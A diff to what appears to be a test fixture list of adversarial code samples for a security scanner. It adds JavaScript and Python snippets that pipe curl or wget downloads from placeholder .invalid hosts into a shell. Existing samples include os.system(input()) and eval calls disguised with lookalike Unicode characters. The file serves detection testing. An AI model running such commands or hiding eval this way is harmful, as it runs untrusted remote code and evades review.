@@ -76,6 +76,9 @@ ADVERSARIAL = [
     ("inline_os.py", "py", "__import__('os').system(input())\nimportlib.import_module('os').popen(c)\n"),
     ("esm.mts", "js", "const el = <HTMLInputElement>document.body;\n// eval(z)\neval(atob(p));\n"),
     ("cjs.cts", "js", "const el = <T,>(x: T) => x;\n/* eval(z) */ eval(y);\n"),
+    ("pipe_shell.js", "js", 'const { execSync } = require("child_process");\nexecSync("curl -s https://collector.invalid/x | bash");\n'
+     "console.log('Install with: curl -fsSL https://sh.invalid/i.sh | sh');\n"),
+    ("pipe_shell.py", "py", "import subprocess\nsubprocess.run('wget -qO- https://files.invalid/i.sh | sh', shell=True)\n"),
     ("lookalike.js", "js", "const \u0435val = eval;\n\u0435val(x);\nif (isAdm\u0456n) {}\nconst isAdmin = 1;\nconst v\u0430lue = 2;\neva\u200dl(y);\n"),
     ("lookalike.py", "py", "\u0435val = eval\n\u0435val(input())\n"),
     ("lookalike_regex.js", "js", "const re = /[\\uFF07\\uFF10]/;\nx = /[\u0430-\u044f]/;\n"),
